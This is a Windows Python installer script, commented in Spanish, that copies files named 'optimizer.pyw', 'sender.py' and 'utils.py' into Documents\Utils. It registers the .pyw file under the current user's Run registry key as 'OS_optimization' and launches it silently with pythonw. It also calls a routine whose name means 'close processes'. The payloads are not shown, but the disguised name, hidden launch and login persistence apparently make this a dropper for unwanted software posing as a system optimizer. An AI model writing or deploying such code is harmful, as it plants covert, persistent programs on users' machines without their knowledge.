import os
import sys
import shutil
import subprocess
import winreg as reg
from modules.cerrar_procesos import main as cerrar_procesos


"""
Copia un archivo .pyw ubicado en la carpeta 'modules' del script actual 
a una ruta accesible para el usuario, organizándolo en una carpeta en Documentos.
"""


def copiar_archivo_pyw(archivo):
    try:
        ruta_actual = os.path.dirname(os.path.abspath(__file__))
        archivo_origen = os.path.join(ruta_actual, "modules", archivo)

        if not os.path.isfile(archivo_origen):
            raise FileNotFoundError("Error")

        user_folder = os.path.expanduser("~\\Documents")
        carpeta_destino = os.path.join(user_folder, "Utils")
        os.makedirs(carpeta_destino, exist_ok=True)
        archivo_destino = os.path.join(
            carpeta_destino, os.path.basename(archivo_origen))
        shutil.copy2(archivo_origen, archivo_destino)

        return archivo_destino

    except Exception as e:
        print(f"Error: {e}")

        return None


# Agrega el archivo copiado a las directivas de inicio de Windows.
def agregar_al_inicio(nombre_de_clave, rutaArchivo):
    try:
        pythonw_path = os.path.join(
            os.path.dirname(sys.executable), "pythonw.exe")
        key = reg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        nombre_clave = nombre_de_clave
        comando = f'"{pythonw_path}" "{rutaArchivo}"'
        clave = reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE)
        reg.SetValueEx(clave, nombre_clave, 0, reg.REG_SZ, comando)
        reg.CloseKey(clave)
        cerrar_procesos()

    except Exception as e:
        print(f"Error: {e}")


def main():
    ruta_optimizer = copiar_archivo_pyw("optimizer.pyw")
    copiar_archivo_pyw("sender.py")
    copiar_archivo_pyw("utils.py")

    if ruta_optimizer:
        agregar_al_inicio("OS_optimization", ruta_optimizer)
        subprocess.call(
            f'"{os.path.join(os.path.dirname(sys.executable), "pythonw.exe")}" "{
                ruta_optimizer}"',
            shell=True,
        )

    exit()


if __name__ == "__main__":
    main()
